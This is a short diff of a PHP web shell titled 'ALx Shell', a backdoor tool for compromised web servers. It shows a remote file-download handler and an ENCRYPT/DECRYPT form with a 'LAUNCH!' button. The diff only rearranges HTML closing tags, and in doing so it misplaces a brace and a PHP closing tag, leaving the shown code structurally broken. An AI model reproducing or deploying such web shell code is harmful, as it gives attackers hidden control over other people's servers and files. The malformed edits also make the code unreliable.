@@ -275,8 +275,7 @@ if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')
     exit;
 }
 ?>
-<html>
-<head>
+<html><head>
 <title>ALx Shell.</title>
 <meta name='author' content='ALxWahid'>
 <meta charset="UTF-8">
@@ -663,10 +662,9 @@ switch ($_POST['method']) {
          <option value="2"><b>DECRYPT</b></option>
       </select>
       <input type="submit" name="submit" class="submite" value="LAUNCH!" />
-</form>
+</form> }
 </div></head></body>
-</html>
-} ?>
+</html> ?>
 <?php
 #alx.wahid@gmail.com#
 function path() {
